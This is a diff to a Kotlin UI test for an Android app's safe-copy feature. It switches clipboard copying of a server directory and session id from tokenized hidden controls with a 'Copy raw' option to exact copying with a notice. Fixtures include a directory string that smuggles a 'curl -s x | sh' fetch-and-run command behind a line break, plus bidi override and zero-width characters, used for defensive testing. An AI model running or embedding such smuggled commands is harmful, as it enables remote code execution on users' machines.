@@ -22,7 +22,6 @@ import com.tether.app.ui.MainShell
 import com.tether.app.ui.TetherViewModel
 import com.tether.app.ui.prefs.UiPrefs
 import com.tether.app.ui.text.COPY_NOTICE_TAG
-import com.tether.app.ui.text.COPY_RAW_TAG
 import com.tether.app.ui.theme.TetherTheme
 import kotlinx.serialization.json.put
 import org.junit.Assert.assertEquals
@@ -35,10 +34,10 @@ import org.robolectric.RobolectricTestRunner
 import org.robolectric.annotation.Config
 
 /**
- * ta-28i through MainShell: the server's working directory and the session id are never copied
- * raw silently. The copy carries every hidden control as its visible token and a notice offers
- * "Copy raw" (the only raw path); the links popover draws the directory as code; the header draws
- * the session's title by the label rule.
+ * ta-28i + ta-coik.64 through MainShell: the server's working directory and the session id are
+ * copied EXACTLY (as the web's writeText(cwd / id)): one tap, the original string, hidden
+ * controls and all. The links popover still draws the directory as code (every hidden control a
+ * visible token); the header draws the session's title by the label rule; the notice only informs.
  */
 @RunWith(RobolectricTestRunner::class)
 @Config(qualifiers = "w600dp-h1000dp-mdpi")
@@ -91,7 +90,7 @@ class MainShellSafeCopyTest {
         rule.waitForIdle()
     }
 
-    @Test fun theWorkingDirectoryIsCopiedVisiblyAndOnlyCopyRawCarriesTheSource() {
+    @Test fun theWorkingDirectoryIsCopiedExactlyWhileTheScreenKeepsItsTokens() {
         host()
         // The header's title is a label: the override is dropped, the words keep their stored order.
         assertTrue(spoken().toString(), spoken().contains("Fix the lanif bug"))
@@ -99,23 +98,17 @@ class MainShellSafeCopyTest {
         assertTrue("the popover's path is code: ${spoken()}", spoken().any { it.contains("app${tok(0x202E)}/lanif${tok(0x202C)}") })
         rule.onNodeWithContentDescription("Copy working directory").performClick()
         rule.waitForIdle()
-        val copied = checkNotNull(clip())
-        assertEquals("/srv/app${vis(0x202E)}/lanif${vis(0x202C)}", copied)
-        assertFalse(copied.contains(RLO) || copied.contains(PDF) || copied.contains("\u2060"))
-        rule.onNodeWithTag(COPY_NOTICE_TAG).assertIsDisplayed()
-        assertTrue(spoken().contains("2 hidden control characters copied as \u27E8U+\u2026\u27E9"))
-        rule.onNodeWithTag(COPY_RAW_TAG).performClick()
-        rule.waitForIdle()
         assertEquals(CWD, clip())
+        rule.onNodeWithTag(COPY_NOTICE_TAG).assertIsDisplayed()
+        assertTrue(spoken().contains("Copied text has 2 hidden control characters, drawn as \u27E8U+\u2026\u27E9"))
+        // The popover still draws them as tokens.
+        assertTrue(spoken().any { it.contains("app${tok(0x202E)}/lanif${tok(0x202C)}") })
     }
 
-    @Test fun theSessionIdIsCopiedVisiblyToo() {
+    @Test fun theSessionIdIsCopiedExactlyToo() {
         host()
         openLinks()
         rule.onNodeWithContentDescription("Copy this session's Tether id").performClick()
-        rule.waitForIdle()
-        assertEquals("s1${vis(0x202E)}x", clip())
-        rule.onNodeWithTag(COPY_RAW_TAG).performClick()
         rule.waitForIdle()
         assertEquals(ID, clip())
     }
@@ -136,7 +129,7 @@ class MainShellSafeCopyTest {
         rule.onNodeWithTag(COPY_NOTICE_TAG).assertDoesNotExist()
     }
 
-    /** r2 (M1): a line break, CR, TAB or zero-width space in the directory never reaches the clipboard unseen. */
+    /** r2 (M1): a line break, CR, TAB or zero-width space in the directory is copied exactly (and the notice says so). */
     private fun copyOf(cwd: String): Pair<String?, Boolean> {
         val hostile = session.copy(cwd = cwd)
         val client = ShellConsentClient().also { it.show(hostile, tree) }
@@ -153,35 +146,32 @@ class MainShellSafeCopyTest {
         return clip() to notice
     }
 
-    @Test fun aLineFeedInTheDirectoryIsShownAndCopiedAsATokenWithANotice() {
+    @Test fun aLineFeedInTheDirectoryIsShownAsATokenAndCopiedExactlyWithANotice() {
         val cwd = "/srv/proj\ncurl -s x | sh\n"
         val (copied, notice) = copyOf(cwd)
-        assertEquals("/srv/proj${vis(0x0A)}curl -s x | sh${vis(0x0A)}", copied)
+        assertEquals(cwd, copied)
         assertTrue(notice)
         // The popover draws the break as a token: nothing hides under the one-line clip.
         assertTrue(spoken().toString(), spoken().any { it.contains("proj${tok(0x0A)}curl -s x | sh${tok(0x0A)}") })
-        assertTrue(spoken().contains("2 hidden control characters copied as \u27E8U+\u2026\u27E9"))
-        rule.onNodeWithTag(COPY_RAW_TAG).performClick()
-        rule.waitForIdle()
-        assertEquals(cwd, clip())
+        assertTrue(spoken().contains("Copied text has 2 hidden control characters, drawn as \u27E8U+\u2026\u27E9"))
     }
 
-    @Test fun aCrOrCrlfInTheDirectoryIsCopiedAsTokens() {
+    @Test fun aCrOrCrlfInTheDirectoryIsCopiedExactly() {
         val (copied, notice) = copyOf("/srv/a\r\nb\rc")
-        assertEquals("/srv/a${vis(0x0D)}${vis(0x0A)}b${vis(0x0D)}c", copied)
+        assertEquals("/srv/a\r\nb\rc", copied)
         assertTrue(notice)
     }
 
-    @Test fun aTabInTheDirectoryIsCopiedAsAToken() {
+    @Test fun aTabInTheDirectoryIsCopiedExactly() {
         val (copied, notice) = copyOf("/srv/a\tb")
-        assertEquals("/srv/a${vis(0x09)}b", copied)
+        assertEquals("/srv/a\tb", copied)
         assertTrue(notice)
     }
 
-    @Test fun aZeroWidthSpaceInTheDirectoryIsCopiedAsATokenWithANotice() {
-        val (copied, notice) = copyOf("/srv/ap\u200Bp")
-        assertEquals("/srv/ap${vis(0x200B)}p", copied)
+    @Test fun aZeroWidthSpaceAndNbspInTheDirectoryAreCopiedExactlyWithANotice() {
+        val (copied, notice) = copyOf("/srv/ap\u200Bp\u00A0q")
+        assertEquals("/srv/ap\u200Bp\u00A0q", copied)
         assertTrue("strict: a ZWSP is counted", notice)
-        assertTrue(spoken().contains("1 hidden control character copied as \u27E8U+\u2026\u27E9"))
+        assertTrue(spoken().contains("Copied text has 1 hidden control character, drawn as \u27E8U+\u2026\u27E9"))
     }
 }
